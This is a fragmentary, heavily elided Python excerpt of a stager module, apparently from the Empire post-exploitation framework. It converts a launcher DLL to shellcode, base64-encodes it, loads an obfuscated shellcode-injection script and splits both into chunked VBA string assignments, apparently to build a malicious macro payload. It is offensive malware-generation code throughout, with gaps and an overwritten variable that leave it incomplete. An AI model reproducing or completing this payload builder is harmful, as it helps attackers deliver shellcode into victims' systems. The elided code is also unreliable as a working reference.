...
#from lib.common import ConvertToShellcode
...
class Stager:
    ...
    def generate(self):
        ...
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            ...
            # convert written dll to shellcode
            dll = open(r'/tmp/launcher.dll', 'rb').read()
            shellbytes = ShellcodeRDI.ConvertToShellcode(dll, functionHash=0x10, userData=b'None')

            #convert shellcode to base64
            shell64 = shellbytes.encode('base64')
            ...
            chunks = list(helpers.chunks(shell64, 50))
            ...
            # chunk invoke-shellcode
            invokeshell64 = open('/opt/Empire/data/misc/obsucated_shellinject.txt', 'r')
            content = invokeshell64.read()
            chunks = list(helpers.chunks(content, 50))

            # concatenate
            payload2 = "\tDim " + Str + " As String\n"
            payload2 += "\t" + Str + " = \"" + str(chunks[0]).replace("\"", "\"\"") + "\"\n"
            for chunk in chunks[1:]:
                payload2 += "\t" + Str + " = " + Str + " + \"" + str(chunk).replace("\"", "\"\"") + "\"\n"
